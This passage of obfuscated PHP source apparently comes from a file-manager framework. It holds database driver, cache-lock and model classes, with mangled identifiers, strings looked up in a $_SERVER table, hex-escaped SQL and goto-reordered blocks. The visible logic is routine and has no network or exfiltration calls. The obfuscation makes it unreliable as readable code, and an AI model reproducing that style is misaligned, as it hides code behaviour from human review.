0; if (!$Ú¸∞ÿÖﬁ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $œË¥åÀ– = $this->_linkID->rollback(); $this->transTimes = 0; if (!$œË¥åÀ–) { $this->error(); return !1; } } return !0; } private function getAll() { $ËíùÆªﬂ = array(); if ($this->numRows > 0) { for ($≠›çæ—µ = 0; $≠›çæ—µ < $this->numRows; $≠›çæ—µ++) { $ËíùÆªﬂ[$≠›çæ—µ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ËíùÆªﬂ; } public function getFields($ŒÛÙ©≠Å) { $Üûœã¢Ï =& $_SERVER[Á≈ ä ∞]; $˚˛ºùûñ = $this->query($Üûœã¢Ï[900] . $this->parseKey($ŒÛÙ©≠Å)); $≠ÿÚ©Ê› = array(); if ($˚˛ºùûñ) { foreach ($˚˛ºùûñ as $ãπû™ââ => $‚‹Ï⁄∞’) { $≠ÿÚ©Ê›[$‚‹Ï⁄∞’[$Üûœã¢Ï[41]]] = array($Üûœã¢Ï[42] => $‚‹Ï⁄∞’[$Üûœã¢Ï[41]], $Üûœã¢Ï[43] => $‚‹Ï⁄∞’[$Üûœã¢Ï[44]], $Üûœã¢Ï[45] => (bool) ($‚‹Ï⁄∞’[$Üûœã¢Ï[46]] === $Üûœã¢Ï[22]), $Üûœã¢Ï[47] => $‚‹Ï⁄∞’[$Üûœã¢Ï[48]], $Üûœã¢Ï[49] => strtolower($‚‹Ï⁄∞’[$Üûœã¢Ï[50]]) == $Üûœã¢Ï[51], $Üûœã¢Ï[52] => strtolower($‚‹Ï⁄∞’[$Üûœã¢Ï[53]]) == $Üûœã¢Ï[54]); } } return $≠ÿÚ©Ê›; } public function getTables($“Òº±ãÙ = '') { $ù·æ¶≤â =& $_SERVER[Á≈ ä ∞]; $ﬁôæ¬≥À = !empty($“Òº±ãÙ) ? $ù·æ¶≤â[902] . $“Òº±ãÙ . $ù·æ¶≤â[903] : $ù·æ¶≤â[904]; $·‹ˆµØ§ = $this->query($ﬁôæ¬≥À); $…¬Ç¿©® = array(); if ($·‹ˆµØ§) { foreach ($·‹ˆµØ§ as $Çå’ËΩô => $ÖÑÍˆôÁ) { $…¬Ç¿©®[$Çå’ËΩô] = current($ÖÑÍˆôÁ); } } return $…¬Ç¿©®; } public function replace($¸§åãûô, $òûπ•öÏ = array()) { $¯£“ÄÌ÷ =& $_SERVER[Á≈ ä ∞]; foreach ($¸§åãûô as $ù⁄äÆìô => $æ“åΩπ) { $¨≠‹Îü≤ = $this->parseValue($æ“åΩπ); if (is_scalar($¨≠‹Îü≤)) { $Éøßé∫˘[] = $¨≠‹Îü≤; $Õß†›Õ°[] = $this->parseKey($ù⁄äÆìô); } } $˜›éŒ•‹ = $¯£“ÄÌ÷[905] . $this->parseTable($òûπ•öÏ[$¯£“ÄÌ÷[288]]) . $¯£“ÄÌ÷[906] . implode($¯£“ÄÌ÷[60], $Õß†›Õ°) . $¯£“ÄÌ÷[907] . implode($¯£“ÄÌ÷[60], $Éøßé∫˘) . $¯£“ÄÌ÷[908]; return $this->execute($˜›éŒ•‹); } public function insertAll($ô‰¿È«≠, $à¡∏Çìá = array(), $ñ‘π◊ÜÃ = false) { $·êåàñ¶ =& $_SERVER[Á≈ ä ∞]; if (!is_array($ô‰¿È«≠[0])) { return !1; } $Œï€Ÿó≠ = array_keys($ô‰¿È«≠[0]); $¡®çñÅ· = array(); foreach ($ô‰¿È«≠ as $äÿ˜êÀﬂ) { $„ﬂﬁ·‘¿ = array(); foreach ($äÿ˜êÀﬂ as $ïƒ˙…∞Ê => $˛ÂÒè¯•) { $˛ÂÒè¯• = $this->parseValue($˛ÂÒè¯•); if (is_scalar($˛ÂÒè¯•)) { $„ﬂﬁ·‘¿[] = $˛ÂÒè¯•; } } $¡®çñÅ·[] = $·êåàñ¶[269] . implode($·êåàñ¶[60], $„ﬂﬁ·‘¿) . $·êåàñ¶[908]; } array_walk($Œï€Ÿó≠, array($this, $·êåàñ¶[909])); $˚∫›ë©π = $ñ‘π◊ÜÃ ? $·êåàñ¶[910] : $·êåàñ¶[911]; $≤˘≠Ωú = $˚∫›ë©π . $·êåàñ¶[912] . $this->parseTable($à¡∏Çìá[$·êåàñ¶[288]]) . $·êåàñ¶[906] . implode($·êåàñ¶[60], $Œï€Ÿó≠) . $·êåàñ¶[913] . implode($·êåàñ¶[60], $¡®çñÅ·); return $this->execute($≤˘≠Ωú); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $àë•™¿≠ =& $_SERVER[Á≈ ä ∞]; $this->error = $this->_linkID->errno . $àë•™¿≠[4] . $this->_linkID->error; if ($àë•™¿≠[22] != $this->queryStr) { $this->error .= LNG($àë•™¿≠[58]) . $this->queryStr; } think_trace($this->error, $àë•™¿≠[22], $àë•™¿≠[59]); return $this->error; } public function escapeString($ÿ˙À†˘≠) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÿ˙À†˘≠); } else { return addslashes($ÿ˙À†˘≠); } } public function parseKey(&$ﬁÒ„ùÏœ, $Õﬂ˝îë† = true) { $˛Ò∑Á≤¯ =& $_SERVER[Á≈ ä ∞]; if ($Õﬂ˝îë†) { $ﬁÒ„ùÏœ = $this->parseKeyCheck($ﬁÒ„ùÏœ); } if ($ﬁÒ„ùÏœ != $˛Ò∑Á≤¯[198] && !preg_match($˛Ò∑Á≤¯[914], $ﬁÒ„ùÏœ)) { $ﬁÒ„ùÏœ = $˛Ò∑Á≤¯[394] . trim($ﬁÒ„ùÏœ, $˛Ò∑Á≤¯[394]) . $˛Ò∑Á≤¯[394]; } return $ﬁÒ„ùÏœ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ò∏¶›¥Ø = '') { $ˆêÛ”£¯ =& $_SERVER[Á≈ ä ∞]; if (!class_exists($ˆêÛ”£¯[917])) { think_exception(think_lang($ˆêÛ”£¯[24]) . $ˆêÛ”£¯[918]); } if (!empty($Ò∏¶›¥Ø)) { $this->config = $Ò∏¶›¥Ø; if (empty($this->config[$ˆêÛ”£¯[27]])) { $this->config[$ˆêÛ”£¯[27]] = array(); } } } public function connect($ñØõæ¡Ä = '', $ÊÜ›Ïèö = 0) { $≥ °˜áπ =& $_SERVER[Á≈ ä ∞]; if (!isset($this->linkID[$ÊÜ›Ïèö])) { if (empty($ñØõæ¡Ä)) { $ñØõæ¡Ä = $this->config; } $ÄŒöÜ¥à = !empty($ñØõæ¡Ä[$≥ °˜áπ[27]][$≥ °˜áπ[28]]) ? $ñØõæ¡Ä[$≥ °˜áπ[27]][$≥ °˜áπ[28]] : $this->pconnect; if ($ÄŒöÜ¥à) { $ñØõæ¡Ä[$≥ °˜áπ[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÊÜ›Ïèö] = new PDO($ñØõæ¡Ä[$≥ °˜áπ[919]], $ñØõæ¡Ä[$≥ °˜áπ[891]], $ñØõæ¡Ä[$≥ °˜áπ[892]], $ñØõæ¡Ä[$≥ °˜áπ[27]]); } catch (PDOException $’…Á‚ ∂) { think_exception($’…Á‚ ∂->getMessage()); } $this->dbType = $this->_getDsnType($ñØõæ¡Ä[$≥ °˜áπ[919]]); if (in_array($this->dbType, array($≥ °˜áπ[920], $≥ °˜áπ[921], $≥ °˜áπ[922], $≥ °˜áπ[923]))) { think_exception($≥ °˜áπ[924] . $this->dbType . $≥ °˜áπ[925] . $this->dbType . $≥ °˜áπ[926]); } if (!$this->linkID[$ÊÜ›Ïèö]) { think_exception($≥ °˜áπ[927]); } try { $this->linkID[$ÊÜ›Ïèö]->exec($≥ °˜áπ[928] . think_config($≥ °˜áπ[894])); } catch (Exception $’…Á‚ ∂) { } $this->connected = !0; if (1 != think_config($≥ °˜áπ[32])) { unset($this->config); } } return $this->linkID[$ÊÜ›Ïèö]; } public function free() { $this->PDOStatement = null; } public function query($ìº§√∆», $ÎÚ»§ñı = array()) { $Ú≤Óï™Í =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìº§√∆»; if (!empty($ÎÚ»§ñı)) { $this->queryStr .= $Ú≤Óï™Í[929] . print_r($ÎÚ»§ñı, !0) . $Ú≤Óï™Í[930]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ú≤Óï™Í[33], 1); think_status($Ú≤Óï™Í[34]); $this->PDOStatement = $this->_linkID->prepare($ìº§√∆»); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $çµ≈ÿÜÔ = $this->PDOStatement->execute($ÎÚ»§ñı); $this->debug(); if (!1 === $çµ≈ÿÜÔ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÉÄΩôÏ˜, $áûê°£µ = array()) { $Û’í…„‹ =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉÄΩôÏ˜; if (!empty($áûê°£µ)) { $this->queryStr .= $Û’í…„‹[929] . print_r($áûê°£µ, !0) . $Û’í…„‹[930]; } $Ï˝¯ŒÈ€ = !1; if ($this->dbType == $Û’í…„‹[923]) { if (preg_match($Û’í…„‹[931], $this->queryStr, $ö˘≠ÃÊÄ)) { $this->table = think_config($Û’í…„‹[932]) . str_ireplace(think_config($Û’í…„‹[933]), $Û’í…„‹[387], $ö˘≠ÃÊÄ[2]); $Ï˝¯ŒÈ€ = (bool) $this->query($Û’í…„‹[934] . strtoupper($this->table) . $Û’í…„‹[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Û’í…„‹[35], 1); think_status($Û’í…„‹[34]); $this->PDOStatement = $this->_linkID->prepare($ÉÄΩôÏ˜); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÓËéÔ‘“ = $this->PDOStatement->execute($áûê°£µ); $this->debug(); if (!1 === $ÓËéÔ‘“) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ï˝¯ŒÈ€ || preg_match($Û’í…„‹[935], $ÉÄΩôÏ˜)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Â¿«‘ÿñ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Â¿«‘ÿñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $“ØûÒãº = $this->_linkID->rollback(); $this->transTimes = 0; if (!$“ØûÒãº) { $this->error(); return !1; } } return !0; } private function getAll() { $˚È¶Ωâ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($˚È¶Ωâ); return $˚È¶Ωâ; } public function getFields($ªﬁï˘†‹) { $ÚôÛé™« =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (think_config($ÚôÛé™«[936])) { $§˙ù∑ïõ = str_replace($ÚôÛé™«[937], $ªﬁï˘†‹, think_config($ÚôÛé™«[936])); } else { switch ($this->dbType) { case $ÚôÛé™«[920]: case $ÚôÛé™«[938]: $§˙ù∑ïõ = "\x53\x45\x4c\105\x43\x54\40\x20\40\x63\x6f\154\165\155\x6e\137\x6e\141\155\x65\40\x61\163\x20\47\116\x61\x6d\145\x27\54\40\40\x20\x64\x61\164\x61\137\x74\171\x70\x65\40\141\163\x20\x27\x54\171\x70\x65\x27\x2c\x20\40\40\x63\157\x6c\165\x6d\x6e\x5f\x64\145\x66\x61\165\x6c\x74\x20\x61\163\40\47\x44\x65\146\x61\x75\x6c\x74\47\x2c\x20\40\x20\x69\163\x5f\x6e\x75\x6c\x6c\x61\142\154\145\x20\141\163\40\x27\116\165\154\154\x27\12\x9\11\x46\x52\117\x4d\11\x69\x6e\146\157\x72\155\x61\164\151\157\156\137\x73\143\x68\145\155\141\56\x74\141\142\x6c\145\x73\40\x41\123\x20\164\xa\x9\11\x4a\117\111\116\11\151\x6e\146\x6f\x72\155\141\x74\151\x6f\x6e\x5f\163\x63\x68\x65\x6d\x61\56\143\157\x6c\x75\155\156\163\40\x41\123\x20\143\12\11\11\117\x4e\40\x20\x74\56\164\x61\142\x6c\x65\137\143\141\164\141\x6c\x6f\147\x20\x3d\40\143\x2e\164\x61\142\154\145\x5f\143\x61\x74\x61\154\x6f\147\xa\11\x9\x41\116\104\x20\x74\x2e\164\141\x62\154\145\x5f\x73\143\x68\x65\x6d\141\40\75\40\x63\x2e\x74\x61\142\x6c\x65\x5f\x73\143\150\x65\x6d\141\xa\11\x9\101\x4e\104\40\164\x2e\164\141\x62\154\145\137\x6e\x61\155\x65\40\75\x20\143\x2e\x74\x61\142\x6c\x65\x5f\x6e\x61\155\145\12\11\x9\127\110\105\x52\x45\x20\40\40\164\56\164\141\x62\x6c\145\x5f\x6e\x61\155\145\40\75\x20\47{$ªﬁï˘†‹}\x27"; break; case $ÚôÛé™«[939]: $§˙ù∑ïõ = $ÚôÛé™«[940] . $ªﬁï˘†‹ . $ÚôÛé™«[941]; break; case $ÚôÛé™«[921]: case $ÚôÛé™«[923]: $§˙ù∑ïõ = $ÚôÛé™«[942] . $ÚôÛé™«[943] . $ÚôÛé™«[944] . strtoupper($ªﬁï˘†‹) . $ÚôÛé™«[945] . strtoupper($ªﬁï˘†‹) . $ÚôÛé™«[946]; break; case $ÚôÛé™«[947]: $§˙ù∑ïõ = $ÚôÛé™«[948] . $ªﬁï˘†‹ . $ÚôÛé™«[949]; break; case $ÚôÛé™«[922]: break; case $ÚôÛé™«[950]: default: $§˙ù∑ïõ = $ÚôÛé™«[951] . ($this->dbType == $ÚôÛé™«[950] ? "\x60{$ªﬁï˘†‹}\x60" : $ªﬁï˘†‹); } } $Ò—ÄË∞ø = $this->query($§˙ù∑ïõ); $ÕÔ∫ﬁÊ‘ = array(); if ($Ò—ÄË∞ø) { foreach ($Ò—ÄË∞ø as $ôßÑ«’¨ => $À‹¿›Ô˙) { $À‹¿›Ô˙ = array_change_key_case($À‹¿›Ô˙); $À‹¿›Ô˙[$ÚôÛé™«[42]] = isset($À‹¿›Ô˙[$ÚôÛé™«[42]]) ? $À‹¿›Ô˙[$ÚôÛé™«[42]] : $ÚôÛé™«[387]; $À‹¿›Ô˙[$ÚôÛé™«[43]] = isset($À‹¿›Ô˙[$ÚôÛé™«[43]]) ? $À‹¿›Ô˙[$ÚôÛé™«[43]] : $ÚôÛé™«[387]; $•¢˜˚€Ó = isset($À‹¿›Ô˙[$ÚôÛé™«[282]]) ? $À‹¿›Ô˙[$ÚôÛé™«[282]] : $À‹¿›Ô˙[$ÚôÛé™«[42]]; $ÕÔ∫ﬁÊ‘[$•¢˜˚€Ó] = array($ÚôÛé™«[42] => $•¢˜˚€Ó, $ÚôÛé™«[43] => $À‹¿›Ô˙[$ÚôÛé™«[43]], $ÚôÛé™«[45] => (bool) (isset($À‹¿›Ô˙[$ÚôÛé™«[113]]) && $À‹¿›Ô˙[$ÚôÛé™«[113]] === $ÚôÛé™«[22] || isset($À‹¿›Ô˙[$ÚôÛé™«[45]]) && $À‹¿›Ô˙[$ÚôÛé™«[45]] === $ÚôÛé™«[22]), $ÚôÛé™«[47] => isset($À‹¿›Ô˙[$ÚôÛé™«[47]]) ? $À‹¿›Ô˙[$ÚôÛé™«[47]] : (isset($À‹¿›Ô˙[$ÚôÛé™«[66]]) ? $À‹¿›Ô˙[$ÚôÛé™«[66]] : $ÚôÛé™«[387]), $ÚôÛé™«[49] => isset($À‹¿›Ô˙[$ÚôÛé™«[104]]) ? strtolower($À‹¿›Ô˙[$ÚôÛé™«[104]]) == $ÚôÛé™«[51] : (isset($À‹¿›Ô˙[$ÚôÛé™«[67]]) ? $À‹¿›Ô˙[$ÚôÛé™«[67]] : !1), $ÚôÛé™«[52] => isset($À‹¿›Ô˙[$ÚôÛé™«[952]]) ? strtolower($À‹¿›Ô˙[$ÚôÛé™«[952]]) == $ÚôÛé™«[54] : (isset($À‹¿›Ô˙[$ÚôÛé™«[104]]) ? $À‹¿›Ô˙[$ÚôÛé™«[104]] : !1)); } } return $ÕÔ∫ﬁÊ‘; } public function getTables($á¬˛ªóÃ = '') { $õÎøáîÒ =& $_SERVER[Á≈ ä ∞]; if (think_config($õÎøáîÒ[953])) { $ú√˝èÈó = str_replace($õÎøáîÒ[954], $á¬˛ªóÃ, think_config($õÎøáîÒ[953])); } else { switch ($this->dbType) { case $õÎøáîÒ[921]: case $õÎøáîÒ[923]: $ú√˝èÈó = $õÎøáîÒ[955]; break; case $õÎøáîÒ[920]: case $õÎøáîÒ[938]: $ú√˝èÈó = $õÎøáîÒ[956]; break; case $õÎøáîÒ[947]: $ú√˝èÈó = $õÎøáîÒ[957]; break; case $õÎøáîÒ[922]: think_exception(think_lang($õÎøáîÒ[958]) . $õÎøáîÒ[959]); break; case $õÎøáîÒ[939]: $ú√˝èÈó = $õÎøáîÒ[55] . $õÎøáîÒ[56] . $õÎøáîÒ[57]; break; case $õÎøáîÒ[950]: default: if (!empty($á¬˛ªóÃ)) { $ú√˝èÈó = $õÎøáîÒ[902] . $á¬˛ªóÃ . $õÎøáîÒ[903]; } else { $ú√˝èÈó = $õÎøáîÒ[904]; } } } $≥¢Ê˚«∆ = $this->query($ú√˝èÈó); $öçµ–¨ã = array(); foreach ($≥¢Ê˚«∆ as $«ª˝÷ª≈ => $∞◊∆›ºÏ) { $öçµ–¨ã[$«ª˝÷ª≈] = current($∞◊∆›ºÏ); } return $öçµ–¨ã; } protected function parseLimit($ﬁ±“˝Âˆ) { $¥ÕÆ≤ëê =& $_SERVER[Á≈ ä ∞]; $Ñç√ì≤í = $¥ÕÆ≤ëê[22]; if (!empty($ﬁ±“˝Âˆ)) { switch ($this->dbType) { case $¥ÕÆ≤ëê[947]: case $¥ÕÆ≤ëê[939]: $ﬁ±“˝Âˆ = explode($¥ÕÆ≤ëê[60], $ﬁ±“˝Âˆ); if (count($ﬁ±“˝Âˆ) > 1) { $Ñç√ì≤í .= $¥ÕÆ≤ëê[61] . $ﬁ±“˝Âˆ[1] . $¥ÕÆ≤ëê[62] . $ﬁ±“˝Âˆ[0] . $¥ÕÆ≤ëê[63]; } else { $Ñç√ì≤í .= $¥ÕÆ≤ëê[61] . $ﬁ±“˝Âˆ[0] . $¥ÕÆ≤ëê[63]; } break; case $¥ÕÆ≤ëê[920]: case $¥ÕÆ≤ëê[938]: break; case $¥ÕÆ≤ëê[922]: break; case $¥ÕÆ≤ëê[921]: case $¥ÕÆ≤ëê[923]: break; case $¥ÕÆ≤ëê[950]: default: $Ñç√ì≤í .= $¥ÕÆ≤ëê[61] . $ﬁ±“˝Âˆ . $¥ÕÆ≤ëê[63]; } } return $Ñç√ì≤í; } public function parseKey(&$»¢ﬁ° •, $œÂ˚í‘í = true) { $‚€˝ŸÉº =& $_SERVER[Á≈ ä ∞]; if ($œÂ˚í‘í) { $»¢ﬁ° • = $this->parseKeyCheck($»¢ﬁ° •); } if ($this->dbType == $‚€˝ŸÉº[950]) { if ($»¢ﬁ° • != $‚€˝ŸÉº[198] && !preg_match($‚€˝ŸÉº[914], $»¢ﬁ° •)) { $»¢ﬁ° • = $‚€˝ŸÉº[394] . trim($»¢ﬁ° •, $‚€˝ŸÉº[394]) . $‚€˝ŸÉº[394]; } return $»¢ﬁ° •; } else { return parent::parseKey($»¢ﬁ° •, $œÂ˚í‘í); } } public function close() { $this->_linkID = null; } public function error() { $Ø≥£”ÜÇ =& $_SERVER[Á≈ ä ∞]; if ($this->PDOStatement) { $µå⁄Ÿ∏ = $this->PDOStatement->errorInfo(); $this->error = $µå⁄Ÿ∏[1] . $Ø≥£”ÜÇ[4] . $µå⁄Ÿ∏[2]; } else { $this->error = $Ø≥£”ÜÇ[22]; } if ($Ø≥£”ÜÇ[22] != $this->queryStr) { $this->error .= LNG($Ø≥£”ÜÇ[58]) . $this->queryStr; } think_trace($this->error, $Ø≥£”ÜÇ[22], $Ø≥£”ÜÇ[59]); return $this->error; } public function escapeString($“Î‘ô®ë) { $≥çÛ‰˘˘ =& $_SERVER[Á≈ ä ∞]; switch ($this->dbType) { case $≥çÛ‰˘˘[947]: case $≥çÛ‰˘˘[920]: case $≥çÛ‰˘˘[938]: case $≥çÛ‰˘˘[950]: return addslashes($“Î‘ô®ë); case $≥çÛ‰˘˘[922]: case $≥çÛ‰˘˘[939]: case $≥çÛ‰˘˘[921]: case $≥çÛ‰˘˘[923]: return str_ireplace($≥çÛ‰˘˘[68], $≥çÛ‰˘˘[69], $“Î‘ô®ë); } } protected function parseValue($Ö¯˙Âë·) { $”Øâ—¡¬ =& $_SERVER[Á≈ ä ∞]; if (is_string($Ö¯˙Âë·)) { $ñÚûÕﬁ˜ = strpos($Ö¯˙Âë·, $”Øâ—¡¬[4]) === 0 && in_array($Ö¯˙Âë·, array_keys($this->bind)); $Ö¯˙Âë· = $ñÚûÕﬁ˜ ? $this->escapeString($Ö¯˙Âë·) : $”Øâ—¡¬[960] . $this->escapeString($Ö¯˙Âë·) . $”Øâ—¡¬[960]; } elseif (isset($Ö¯˙Âë·[0]) && is_string($Ö¯˙Âë·[0]) && strtolower($Ö¯˙Âë·[0]) == $”Øâ—¡¬[306]) { $Ö¯˙Âë· = $this->escapeString($Ö¯˙Âë·[1]); } elseif (is_array($Ö¯˙Âë·)) { $Ö¯˙Âë· = array_map(array($this, $”Øâ—¡¬[961]), $Ö¯˙Âë·); } elseif (is_bool($Ö¯˙Âë·)) { $Ö¯˙Âë· = $Ö¯˙Âë· ? $”Øâ—¡¬[98] : $”Øâ—¡¬[207]; } elseif (is_null($Ö¯˙Âë·)) { $Ö¯˙Âë· = $”Øâ—¡¬[113]; } return $Ö¯˙Âë·; } public function getLastInsertId() { $øûåˆñ¸ =& $_SERVER[Á≈ ä ∞]; switch ($this->dbType) { case $øûåˆñ¸[947]: case $øûåˆñ¸[939]: case $øûåˆñ¸[920]: case $øûåˆñ¸[938]: case $øûåˆñ¸[922]: case $øûåˆñ¸[950]: return $this->_linkID->lastInsertId(); case $øûåˆñ¸[921]: case $øûåˆñ¸[923]: $íá«˝ÍÇ = $this->table; $ô¢ãÑ—€ = $this->query("\x53\x45\x4c\x45\103\124\x20{$íá«˝ÍÇ}\56\143\x75\x72\x72\166\141\x6c\40\x63\165\x72\162\x76\141\154\x20\x46\x52\x4f\115\x20\x64\x75\x61\x6c"); return $ô¢ãÑ—€ ? $ô¢ãÑ—€[0][$øûåˆñ¸[962]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ò‰›◊èÿ) { $œ◊¢‹–‡ =& $_SERVER[Á≈ ä ∞]; if (!CacheLock::fileLock($œ◊¢‹–‡[23])) { return !1; } $ü‡Øæôº = parent::query($ò‰›◊èÿ); CacheLock::fileUnLock($œ◊¢‹–‡[23]); return $ü‡Øæôº; } public function execute($≠ë‘ÀçÈ) { $¨Ë∆Ì±Ã =& $_SERVER[Á≈ ä ∞]; if (!CacheLock::fileLock($¨Ë∆Ì±Ã[23])) { return !1; } $·Íñ¸÷ﬂ = parent::execute($≠ë‘ÀçÈ); CacheLock::fileUnLock($¨Ë∆Ì±Ã[23]); return $·Íñ¸÷ﬂ; } } goto BœÁøÊ’®Ø; aœÑØ•ê◊∆: class CacheLockMemcached { public function lock($ø∑åº◊†, $€’÷Ÿà‡ = 0) { $øÏëœ¨Ÿ = Cache::init(); $¨¿Œ∏˘í = microtime(!0) + $€’÷Ÿà‡; while (microtime(!0) < $¨¿Œ∏˘í) { $ã˝∑ùÑû = $øÏëœ¨Ÿ->get($ø∑åº◊†); if (!$ã˝∑ùÑû || $ã˝∑ùÑû < microtime(!0)) { $œÆ÷Ó·¥ = $øÏëœ¨Ÿ->handle->add($ø∑åº◊†, $¨¿Œ∏˘í, $€’÷Ÿà‡); if ($œÆ÷Ó·¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Î≠¸¢ñ°) { return Cache::init()->get($Î≠¸¢ñ°); } public function unlock($π—Øô±€) { return Cache::init()->remove($π—Øô±€); } } class CacheLockDatabase { public function lock($‰ë˘ãïç, $°⁄˘Ì÷ = 0) { $Ø˛»‡◊‹ = Model($_SERVER[Á≈ ä ∞][836]); $îõ€¶åÄ = microtime(!0) + $°⁄˘Ì÷; while (microtime(!0) < $îõ€¶åÄ) { $ª≈›Ëèë = $Ø˛»‡◊‹->get($‰ë˘ãïç); if (!$ª≈›Ëèë || $ª≈›Ëèë < microtime(!0)) { $Áü™Éîƒ = $Ø˛»‡◊‹->set($‰ë˘ãïç, $îõ€¶åÄ); if ($Áü™Éîƒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($§›Ôπ√µ) { return Model($_SERVER[Á≈ ä ∞][836])->get($§›Ôπ√µ); } public function unlock($˝’ó∏®ı) { Model($_SERVER[Á≈ ä ∞][836])->remove($˝’ó∏®ı); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($πﬂ˚ù·•, $´¯›Œäú) { $æÅ’îù⁄ =& $_SERVER[Á≈ ä ∞]; if (!class_exists($æÅ’îù⁄[869])) { show_json($æÅ’îù⁄[870], !1); } $this->cacheTime = $´¯›Œäú; $this->handle = new Memcached(); if (is_array($πﬂ˚ù·•[$æÅ’îù⁄[871]]) && count($πﬂ˚ù·•[$æÅ’îù⁄[871]]) >= 1) { foreach ($πﬂ˚ù·•[$æÅ’îù⁄[871]] as $Ï∑∫’ö¬) { $™≠æûë¢ = explode($æÅ’îù⁄[4], $Ï∑∫’ö¬); $this->handle->addServer($™≠æûë¢[0], $™≠æûë¢[1]); } } else { $this->handle->addServer($πﬂ˚ù·•[$æÅ’îù⁄[191]], $πﬂ˚ù·•[$æÅ’îù⁄[192]]); } } public function set($Ù´µé¡˚, $á¢πØ˙§, $ÙíÆÖı⁄ = false) { $ÙíÆÖı⁄ = $ÙíÆÖı⁄ ? $ÙíÆÖı⁄ : $this->cacheTime; return $this->handle->set($Ù´µé¡˚, $á¢πØ˙§, $ÙíÆÖı⁄); } public function get($⁄Æı»˙ä) { return $this->handle->get($⁄Æı»˙ä); } public function remove($¡ﬂ¸˘˙‡) { return $this->handle->delete($¡ﬂ¸˘˙‡); } public function deleteAll() { return $this->handle->flush(); } } goto C´äØ›æÂ≈; c€ßœ‰¨¨ã: define($_SERVER[Á≈ ä ∞][252], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\162\144\x65\x72", "\141\x6c\151\141\163", "\150\x61\166\x69\x6e\x67", "\x67\x72\x6f\165\x70", "\154\x6f\x63\153", "\x64\x69\163\164\x69\x6e\x63\164", "\x61\165\x74\x6f", "\x66\x69\154\164\145\x72", "\x76\x61\x6c\x69\x64\x61\164\x65", "\x72\x65\163\165\154\x74", "\142\151\156\144", "\x74\157\153\145\156"); public function __construct($œ∂›≈Üú = '', $πàêΩà± = '', $µ–ôß®Ì = '') { $⁄ãõÒ“Ï =& $_SERVER[Á≈ ä ∞]; $this->_initialize(); if (!empty($œ∂›≈Üú)) { if (strpos($œ∂›≈Üú, $⁄ãõÒ“Ï[20])) { list($this->dbName, $this->name) = explode($⁄ãõÒ“Ï[20], $œ∂›≈Üú); } else { $this->name = $œ∂›≈Üú; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($πàêΩà±)) { $this->tablePrefix = $⁄ãõÒ“Ï[22]; } elseif ($⁄ãõÒ“Ï[22] != $πàêΩà±) { $this->tablePrefix = $πàêΩà±; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($⁄ãõÒ“Ï[253]); } $this->db(0, empty($this->connection) ? $µ–ôß®Ì : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $€∂Ÿ˜Ï› =& $_SERVER[Á≈ ä ∞]; if (empty($this->fields)) { if (think_config($€∂Ÿ˜Ï›[254])) { $–’·Óé¥ = $this->dbName ? $this->dbName : think_config($€∂Ÿ˜Ï›[255]); $à„Ö€∂ı = think_var_cache($€∂Ÿ˜Ï›[256] . strtolower(get_path_this($–’·Óé¥) . $€∂Ÿ˜Ï›[20] . $this->name)); if ($à„Ö€∂ı) { $≠˚ÈÄ’◊ = think_config($€∂Ÿ˜Ï›[257]); if (empty($≠˚ÈÄ’◊) || $à„Ö€∂ı[$€∂Ÿ˜Ï›[258]] == $≠˚ÈÄ’◊) { $this->fields = $à„Ö€∂ı; return; } } } $this->flush(); } } public function flush() { $¢°¬êøë =& $_SERVER[Á≈ ä ∞]; $this->db->setModel($this->name); $Ü¿îÁ€Á = $this->db->getFields($this->getTableName()); if (!$Ü¿îÁ€Á) { return !1; } $this->fields = array_keys($Ü¿îÁ€Á); $this->fields[$¢°¬êøë[259]] = !1; foreach ($Ü¿îÁ€Á as $Üò£¡Îﬁ => $•˛Ç¡ﬂÁ) { $ÚûÉÇ√ÿ[$Üò£¡Îﬁ] = $•˛Ç¡ﬂÁ[$¢°¬êøë[43]]; if ($•˛Ç¡ﬂÁ[$¢°¬êøë[49]]) { $this->fields[$¢°¬êøë[260]] = $Üò£¡Îﬁ; if ($•˛Ç¡ﬂÁ[$¢°¬êøë[52]]) { $this->fields[$¢°¬êøë[259]] = !0; } } } $this->fields[$¢°¬êøë[261]] = $ÚûÉÇ√ÿ; if (think_config($¢°¬êøë[257])) { 